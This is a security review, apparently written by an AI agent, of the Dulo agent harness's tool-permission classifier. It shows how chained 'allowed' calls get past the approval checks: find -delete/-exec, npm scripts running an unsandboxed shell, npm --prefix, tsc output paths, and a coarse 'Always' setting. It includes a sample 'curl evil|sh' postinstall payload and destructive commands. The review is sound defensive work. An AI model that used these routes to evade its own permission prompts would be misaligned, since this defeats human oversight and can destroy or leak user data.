# Trust boundary review — is any `allowed` rule wrong?

Reviewed: `docs/trust-boundary-design.md`, `src/risk.ts`, `src/permissions.ts`,
`src/tools/system.ts`, `src/tools/file.ts`, `src/tools/scaffold.ts`,
`src/tools/dev-server.ts`, `src/config.ts`, `dulo.config.json`.

All `classify` calls below were run for real with:

```
cd /Users/mac/Desktop/LearnDEV/harness && node --import tsx <script importing src/risk.ts>
```

Every line quoted under a finding is the actual captured stdout, not a prediction.
One finding (npm script execution escaping the shell sandbox) is also verified end
to end with a real `npm run` in `/private/tmp/.../scratchpad/npm-poc` (deleted after,
nothing in the reviewed repo was touched or edited).

Current caveat: `dulo.config.json` currently sets `"approval": {"mode": "ask", ...}`,
which uses `flatClassifier`, not `classify`. Everything below is a review of
`src/risk.ts` (`"mode": "tiers"`, the default in `src/config.ts` and the subject
of the design doc) as instructed, regardless of what today's checked-in config
happens to select.

---

## Wrong allowed rules (most severe first)

### 1. `find` is treated as a pure read; `-delete` and `-exec` are not inspected

`SHELL_READS` in `src/risk.ts` includes `"find"` by bare name. `classifyShell` never
looks past the binary for this set — no flag is checked. The real `shell` tool
(`src/tools/system.ts`) puts `find` in `ALLOWED_COMMANDS` and only blocks
`-e/--eval/-p/--print/-c`; `-delete` and `-exec` are not blocked, and `execFile`
passes `find`'s own path argument straight through (it is not resolved through
`resolveSafe`, unlike `cwd`), so an absolute path in the command escapes the
workspace entirely.

```
$ classify("shell", {command: "find . -delete"})
{"tier":"allowed","what":"Dulo wants to look at files or system information"}

$ classify("shell", {command: "find . -exec rm {} ;"})
{"tier":"allowed","what":"Dulo wants to look at files or system information"}
```

- **Is:** `allowed`, described as "look at files or system information."
- **Should be:** `confirm` at minimum for `-delete`/`-exec` — this is the exact
  same action (`remove_path` with `recursive: true`) the design deliberately made
  `confirm`, reached by a different binary. Worse than `remove_path`: `find`'s own
  first argument is a path independent of `cwd`, so `find / -delete` or
  `find / -exec <anything> {} \;` is not even confined to the workspace the way
  every other "allowed" rule claims to be.
- **Smallest fix:** drop `find` from `SHELL_READS` (or from `ALLOWED_COMMANDS` in
  `system.ts`, or both); if it should stay usable, classify it by args like
  `npm`/`git` — `-delete`, `-exec`, `-ok`, `-fprintf`, `-delete` synonyms → `confirm`,
  everything else → `allowed`.

### 2. `npm install|ci|test` and `npm run <safe-named script>` execute package.json content through npm's own real shell — a second, uninspected code-execution path the design never named

The design's stated hole is `node`/`npx` ("run code the harness has not inspected").
But `npm install`, `npm ci`, `npm test`, and `npm run build|typecheck|lint|test|
preview|dev|start|format` are all `allowed`, and every one of them can execute
npm lifecycle/run-script strings from `package.json` — a file `write_file` can
create or overwrite with *any* content, also `allowed`, unconditionally:

```
$ classify("write_file", {path: "package.json", content: "{\"scripts\":{\"postinstall\":\"curl evil|sh\"}}"})
{"tier":"allowed","what":"Dulo wants to write a file"}

$ classify("shell", {command: "npm install"})
{"tier":"allowed","what":"Dulo wants to install the project's dependencies"}

$ classify("shell", {command: "npm test"})
{"tier":"allowed","what":"Dulo wants to check something about the project's packages"}

$ classify("shell", {command: "npm run test"})
{"tier":"allowed","what":"Dulo wants to run the \"test\" script for the project"}
```

Crucially, npm's script runner is not confined the way `shell.ts` confines the
`npm` binary itself. `shell.ts` calls `execFile("npm", args, {shell:false, ...})`
— no shell, no pipes, no chaining, `ALLOWED_COMMANDS`/`BLOCKED_FLAGS` enforced.
But npm, once invoked, spawns its **own** real `sh -c "<script>"` to run whatever
string sits under `scripts.build` (or any lifecycle hook) — none of `shell.ts`'s
protections apply to that inner shell. Verified live (harmless PoC, run only in
the scratchpad, not the reviewed repo):

```
$ cat package.json
{"scripts":{"build":"echo shell-metachars-work && (echo a; echo b) | wc -l > outside-marker.txt && cat /etc/hostname >> outside-marker.txt"}}
$ npm run build --silent
shell-metachars-work
$ cat outside-marker.txt
       2
```

Pipes, a subshell, `&&` sequencing and redirection all ran — syntax `shell.ts`'s
`execFile(shell:false)` would never allow if the model tried to run it directly
via the `shell` tool. `npm run <safe-named script>`/`npm install`/`npm test` is
therefore not "building the project" in the safe sense the design assumed; it is
"run an arbitrary shell script the model just wrote, through an unsandboxed
shell" — exactly the class of action `node`/`npx` were deliberately made `ask`
for, reachable via two calls that are both already `allowed`.

- **Is:** `allowed` for `npm install|ci|test|run build|run typecheck|run lint|
  run test|run preview|run dev|run start|run format`.
- **Should be:** at least `ask` (matching `node`/`npx`) unless the classifier can
  see that `package.json`'s relevant script content is something it already
  trusts — which it cannot, since it never reads the file.
- **Smallest fix:** either (a) move all of `NPM_SAFE_SUBCOMMANDS`/
  `NPM_SAFE_SCRIPTS` to `ask`, matching `RUNS_ARBITRARY_CODE`'s reasoning, or (b)
  keep them `allowed` only when the classifier (impurely, which breaks INV-21, or
  via a cache built at `write_file` time) has verified the current
  `package.json` scripts are unchanged from the ones the template shipped.

### 3. `npm run build --prefix <outside dir>` is `allowed`, and actually runs outside the workspace

This is the literal case suggested for review. `classifyShell`'s `sub === "run"`
branch only reads the token immediately after `"run"` as the script name; it
never looks at `--prefix` (or `--prefix=<dir>`), which relocates npm's whole
operating root — which `package.json` it reads, and where the script actually
executes — to an arbitrary directory, bypassing `resolveSafe` entirely (npm does
its own directory resolution, not the harness's).

```
$ classify("shell", {command: "npm run build --prefix /tmp"})
{"tier":"allowed","what":"Dulo wants to run the \"build\" script for the project"}

$ classify("shell", {command: "npm run build --prefix /somewhere/else"})
{"tier":"allowed","what":"Dulo wants to run the \"build\" script for the project"}
```

(For contrast, putting `--prefix` *before* `run` breaks the parser's naive
subcommand-finder differently and lands on `ask`, not `allowed` — safe by
accident, not by design: `classify("shell", {command: "npm --prefix /tmp run build"})`
→ `{"tier":"ask","what":"Dulo wants to run \"npm /tmp\""}`. Token order, not
meaning, decides the tier here.)

- **Is:** `allowed`.
- **Should be:** `ask` or `confirm` — this runs a script "for the project" in a
  directory the classifier never inspects, which can be anywhere on disk.
- **Smallest fix:** in the `npm run` branch, check `rest` for `--prefix`/
  `--prefix=...`/`-C`-equivalents before trusting the script-name allowlist; treat
  any such flag as disqualifying from `allowed`.

### 4. `tsc`, `tsc --build`, `tsc -p <config>` are classified as reads; they write files, and `outDir` is not path-checked

`SHELL_READS` includes `"tsc"` by bare name, with no argument inspection at all
(unlike `npm`/`git`). `tsc`'s entire purpose (outside `--noEmit`) is emitting
compiled output to whatever `outDir` a `tsconfig.json` — itself freely writable
via the already-`allowed` `write_file` — specifies. That path is resolved by
`tsc` itself, not by `resolveSafe`.

```
$ classify("shell", {command: "tsc --build"})
{"tier":"allowed","what":"Dulo wants to look at files or system information"}

$ classify("shell", {command: "tsc -p ./tsconfig.json"})
{"tier":"allowed","what":"Dulo wants to look at files or system information"}
```

- **Is:** `allowed`, described as a read ("look at files or system information").
- **Should be:** treated as a workspace write at best (i.e. `allowed` only if the
  classifier also confirms `outDir` stays inside the workspace, which it cannot
  do without reading the tsconfig — otherwise `ask`).
- **Smallest fix:** remove `tsc` from `SHELL_READS`; it belongs with the
  `NPM_SAFE_SCRIPTS`-style writes at best, not with `ls`/`cat`/`grep`.

### 5. (Amplifier, not independent) `alwaysAllow` is keyed by tool name, not by args — one "Always" on `shell` blesses every future `ask`-tier shell command for the rest of the turn

Not a rule in the table by itself, but it turns several `ask` misclassifications
above and in the next section into de-facto `allowed`. `src/permissions.ts`:

```ts
if (decision === "always" && entry.ask.tier === "ask") alwaysAllow.add(entry.ask.tool);
...
if (risk.tier === "allowed" || (risk.tier === "ask" && alwaysAllow.has(ask.tool))) { /* no prompt */ }
```

`entry.ask.tool` / `ask.tool` is always the literal harness tool name (confirmed
in `src/agent.ts:333`, `requestPermission({ id: callId, tool: toolName, args })`)
— for every shell call this is just `"shell"`, never the actual binary. So: the
model runs `node build.js` (correctly `ask`), the user clicks **Always** meaning
"stop asking about builds" — and for the rest of the turn, *any* shell command
that classifies as `ask` (an unrecognized binary, `git -C /tmp push` from finding
below, `npm run <script not in the safe list>`, anything) now runs with **no
prompt at all**, because the check only ever compares against the string
`"shell"`. This is exactly the coarseness ("`shell` is both `npm run build` and
`node deploy.js`") the whole redesign exists to fix, reintroduced at the "always"
layer. `confirm`-tier commands are unaffected (`entry.ask.tier === "ask"` guards
it, matching INV-19), but the `ask` tier has no equivalent protection.

- **Smallest fix:** key `alwaysAllow` by `(tool, binary)` for `shell` (and by
  `(tool)` plus a normalized match key for MCP), not by tool name alone; or scope
  "Always" to the same classification rule that produced the ask, not the tool.

---

## Wrong ask/confirm rules (annoyance only — except where noted)

These do not themselves let anything run unasked; they misjudge how much asking
is warranted. Two of them interact with finding 5 above and are flagged as more
than pure annoyance.

### `git push`/`git <read-or-write>` downgrades from `confirm`/`allowed` to `ask` when the subcommand isn't in the first non-dash position

`classifyShell`'s subcommand finder is `rest.find(t => !t.startsWith("-"))` — the
first token that isn't a flag, whether or not it's actually a flag's *value*.
`git -C <dir> <verb>` and a path-qualified binary both break this:

```
$ classify("shell", {command: "git -C /tmp push"})
{"tier":"ask","what":"Dulo wants to run \"git /tmp\""}

$ classify("shell", {command: "git -C /tmp status"})
{"tier":"ask","what":"Dulo wants to run \"git /tmp\""}

$ classify("shell", {command: "/usr/bin/git push"})
{"tier":"ask","what":"Dulo wants to run \"/usr/bin/git\""}
```

- **Is:** `ask` in all three cases (the generic "no rule, run the binary" bucket).
- **Should be:** `confirm` for the `push` cases (irreversible, reaches a remote —
  same as a bare `git push`, which correctly gets `confirm`); `allowed` for the
  plain `status` case (a read, correctly described elsewhere as `UNDO.nothing`).
- **Why it's more than annoyance:** combined with finding 5, a user who once
  clicks "Always" for any unrelated `ask`-tier shell call has now also
  pre-approved `git -C /tmp push` (or any git push behind a path-qualified
  binary) for the rest of the turn, with no further prompt — a real push,
  silently.
- **Smallest fix:** normalize the binary (strip a path prefix, matching what
  `system.ts` already does with `.split("/").pop()`) before comparing to `"git"`/
  `"npm"`, and for `git`/`npm` specifically, skip *flag arguments that take a
  value* (`-C`, `--prefix`, `-p`), not just tokens starting with `-`, when
  looking for the subcommand.

### Real write-capable MCP tools whose names don't match any pattern land on generic `ask`, not `confirm`

`MCP_CONFIRM`/`MCP_ALLOWED`/`MCP_SERVERS` all assume a `server_verb` snake_case
naming convention. Real MCP servers don't reliably use it. Using this session's
own connected servers as ground truth (Notion via `MCP_DOCKER`, a Telegram
poster):

```
$ classify("API-post-page", {})
{"tier":"ask","what":"Dulo wants to use \"API-post-page\", something Dulo has no rule for"}

$ classify("API-patch-page", {})
{"tier":"ask","what":"Dulo wants to use \"API-patch-page\", something Dulo has no rule for"}

$ classify("API-delete-a-block", {})
{"tier":"ask","what":"Dulo wants to use \"API-delete-a-block\", something Dulo has no rule for"}

$ classify("API-move-page", {})
{"tier":"ask","what":"Dulo wants to use \"API-move-page\", something Dulo has no rule for"}

$ classify("send_dm", {text: "hi"})
{"tier":"ask","what":"Dulo wants to use \"send_dm\", something Dulo has no rule for"}

$ classify("post_to_channel", {})
{"tier":"ask","what":"Dulo wants to use \"post_to_channel\", something Dulo has no rule for"}
```

`API-delete-a-block` doesn't match `/(^|_)delete([_-]|$)/i` because the
separator is a hyphen, not an underscore, and there is no `github_`/`vercel_`/
`supabase_`/`linear_`/`sentry_` prefix to catch it either — this is exactly the
design's "writing to someone else's system" `confirm` category (creating,
moving, or deleting a page/block in a real, shared Notion workspace; sending a
DM or posting to a channel someone else reads), landing on `ask` instead.

- **Is:** `ask` (the final catch-all, not the "no rule for" MCP-specific one,
  since `MCP_SERVERS` doesn't recognize these prefixes either — same tier
  outcome, worth noting the pattern list is stale in both directions).
- **Should be:** `confirm` — same category as `github_(create|update|...)`.
- **Why it's more than annoyance:** finding 5's mechanism applies here too — the
  `alwaysAllow` set is keyed by exact tool name with no argument sensitivity, so
  clicking "Always" once for, say, `API-patch-page` on a harmless edit
  pre-approves every future `API-patch-page` call this turn, including one that
  overwrites something important, with no further prompt.
- **Smallest fix:** broaden the MCP patterns to match hyphenated and `API-`-
  prefixed names, or — safer — flip the default for MCP tools with no
  `MCP_ALLOWED` match: unknown-and-plausibly-a-write MCP tools should default to
  `confirm`, not `ask`, since "no rule" for an external service is exactly the
  case INV-18's "ask, never allowed" reasoning was written for, but applied one
  tier too low given "Always" exists.

### `github_close_pull_request` and similar GitHub verbs outside the fixed prefix list fall to `ask`

```
$ classify("github_close_pull_request", {})
{"tier":"ask","what":"Dulo wants to use github, which is outside this computer"}
```

`MCP_CONFIRM`'s GitHub pattern only covers `create|update|delete|merge|push|add|
fork|transfer`. Closing a PR/issue is a real state change on a shared,
external system (reversible by reopening, so lower severity than the Notion/
Telegram cases above, but the design explicitly lists "GitHub issues, PRs,
comments" as the `confirm` example).

- **Is:** `ask`. **Should be:** `confirm`.
- **Smallest fix:** add `close|reopen|comment|review|dismiss` to the GitHub
  confirm pattern.

---

## Unverified suspicions

- **Git hooks via `write_file` + `git commit`.** Considered as a chained-`allowed`
  attack (`write_file` to `<project>/.git/hooks/post-commit`, then `git commit`,
  both individually `allowed`), but I could not make it fire: git only executes a
  hook file that has the executable bit set, and no tool in this harness
  (`write_file`, `edit_file`, `move_path`, ...) ever calls `chmod`/sets a file
  mode — `write_file`'s `fs.writeFile(target, content, "utf8")` uses the default
  mode with no execute bit, and I found no `chmod` anywhere under `src/tools/`.
  I did not attempt to actually invoke `git commit` against a written hook file
  to double-check git's own behavior end to end (that would require creating a
  real git repo), so I'm listing this as a considered-but-not-fully-disproved
  path rather than a closed one — worth a real test if a chmod-capable tool is
  ever added, since at that point this becomes exploitable with two already-
  `allowed` calls and no `node`/`npx`/`shell`-arbitrary involved at all.
- **`resolveSafe`'s symlink check as a TOCTOU race.** `resolveSafe` calls
  `realpath` once to validate, then the caller does the actual read/write/rename
  afterward — I did not attempt to actually race a symlink swap between the two
  to see whether a workspace-confined path can be redirected outside after the
  check passes. Plausible in principle for any TOCTOU-shaped check; not
  demonstrated here.
- **`dev_server` tool's `start` path.** I confirmed `dev-server.ts` uses
  `resolveSafe` for the project directory and that `classify`'s `dev_server` rule
  ignores all args beyond `action`, but I did not fully trace whether the actual
  command it spawns (`npm run dev`, presumably) is fixed or could be influenced
  by data the model controls (e.g., a `package.json` "dev" script, which per
  finding 2 above is already model-controlled content) into doing something a
  plain dev server wouldn't. Given finding 2, this is likely the same underlying
  issue wearing a different tool name rather than a new one, but I did not
  independently verify it.

---

## What I checked and found correct

- **`file_extract`.** Only supports single-stream `gzip`/`deflate`
  (`createGunzip`/`createInflate`), not a real archive format (`tar`/`zip`) with
  internal path entries — so there is no "zip-slip" style escape to check for:
  both `inputPath` and `outputPath` are explicit tool arguments, both pass
  through `resolveSafe`, and there is no internal file list whose paths could
  point outside the workspace.
- **`move_path`.** Both `from` and `to` pass through `resolveSafe` independently
  before `rename`.
- **`scaffold_project`.** `slug` is validated against `^[a-z0-9][a-z0-9-]{0,39}$`
  before it ever reaches `resolveSafe`/`path.join`, so there's no traversal
  surface via the project name; the template source is a fixed path under
  `TEMPLATES_DIR`, not user input.
- **`remove_path`.** Tier is correctly tied to the `recursive` argument
  (`allowed` for a single file, `confirm` when `recursive === true`); the tool
  itself independently refuses to remove the workspace root regardless of what
  `classify` says.
- **`http_request`.** Unlike the MCP browser tools, this rule actually inspects
  its own argument: method GET/HEAD → `ask`, anything else → `confirm`,
  confirmed by reading `BUILTIN.http_request` — this is the one rule doing what
  the design claims MCP tools do and MCP tools (finding in the `allowed`
  section) do not.
- **Config override ordering.** `classify` checks `policy.confirmTools` before
  `policy.allowTools`, so listing a tool in both correctly resolves to
  `confirm` — the precedence the design specifies is implemented as stated.
  Separately: an owner could put `"shell"` or `"remove_path"` in
  `approval.allowTools` and blanket-defeat the fine-grained rules for that tool
  — but this requires editing `dulo.config.json` directly; it is not reachable
  from the model's own tools (`write_file`'s `resolveSafe` is rooted at
  `WORKSPACE_ROOT`, which is a different directory from `CONFIG_FILE` under
  `HARNESS_ROOT`, per `src/paths.ts`), so it's an owner footgun, not an
  agent-reachable escalation.
- **"Always" never applies to `confirm`.** `src/permissions.ts`'s `settle()`
  only adds to `alwaysAllow` `if (decision === "always" && entry.ask.tier ===
  "ask")` — a `confirm` decision of `"always"` is never recorded as such
  (`INV-19` holds at the gate level; the gap is `ask`-tier coarseness, see
  finding 5).
- **`classify` purity (INV-21).** `src/risk.ts` reads no files, spawns nothing,
  makes no network calls — confirmed by inspection; only `parseCommandLine`
  (pure string parsing) is imported from `system.ts`.
- **Unknown tool default.** Confirmed: an entirely unrecognized tool name (e.g.
  `API-post-page` before considering the MCP-specific patterns) falls through
  every branch to the final `ask(...)` in `classify` — never `allowed`. `INV-18`
  holds as stated.
- **Shell quoting/piping is genuinely neutralized**, as the task predicted: the
  shell tool runs via `execFile(..., {shell:false})` and blocks
  `-e/--eval/-p/--print/-c`, so there is no way to smuggle a second command
  through quoting or `;`/`|`/`&&` at the `shell` tool's own layer — every attack
  above works either through argument-parsing blind spots in `classifyShell`
  itself (findings 1, 3, and the `git -C` case) or through a program that,
  once let through as a recognized safe binary, runs its own internal shell
  that `shell.ts`'s protections never touch (finding 2, `npm` specifically).
